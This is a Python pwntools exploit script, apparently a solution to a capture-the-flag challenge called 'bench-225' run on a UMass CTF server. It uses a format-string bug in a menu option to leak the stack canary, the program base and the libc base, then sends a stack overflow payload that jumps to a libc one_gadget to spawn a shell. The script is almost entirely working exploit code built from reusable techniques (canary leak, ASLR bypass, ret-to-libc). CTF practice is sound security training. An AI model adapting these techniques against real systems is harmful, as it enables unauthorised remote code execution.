#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bench-225", checksec=False)
libc = ELF("./libc6_2.35-0ubuntu3.7_amd64.so", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc bench-225.ctf.umasscybersec.org 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""


def add_10s():
    io.sendlineafter(b"Plate\n", b"1")


def add_25s():
    io.sendlineafter(b"Plate\n", b"2")


def add_45s():
    io.sendlineafter(b"Plate\n", b"3")


def bench():
    io.sendlineafter(b"Plate\n", b"4")


def motivational(data):
    io.sendlineafter(b"Plate\n", b"6")
    if b"\x0a" in data or b"\xff" in data:
        print(data)
        log.error("bad char")
    io.sendlineafter(b"quote: ", data)
    io.recvuntil(b"Quote: \"")
    leak = io.recvline()
    return leak


io = start()

for _ in range(30):
    add_10s()

for _ in range(5):
    bench()


def printf_leak(idx):
    payload = f"%{idx}$p".encode()
    leak = motivational(payload).strip()
    if b"nil" in leak:
        return leak
    return int(leak, 16)


# for i in range(1, 0x40):
#     leak = printf_leak(i)
#     if isinstance(leak, int):
#         log.info(f"{i:02x}: {printf_leak(i):#x}")


canary_idx = 9
pie_idx = 0xb
write_idx = 0x3  # write+23
libc_idx = 0xf   # __libc_start_main_ret

# lookup @ https://libc.rip or
# pwn libcdb lookup write <val> __libc_start_main_ret <val>

canary = printf_leak(canary_idx)
elf.address = printf_leak(pie_idx) - 0x16a1
libc.address = printf_leak(libc_idx) - 0x29d90

log.info(f"{canary=:#x}")
log.info(f"{elf.address=:#x}")
log.info(f"{libc.address=:#x}")

"""
0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  [rbp-0x50] == NULL || rbp-0x50 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
"""
one_gadget = libc.address + 0xebd3f

payload = b"A" * 0x8
payload += flat(
    canary,
    elf.bss(0xc00),
    one_gadget,
)
# pause()
motivational(payload)


io.interactive()
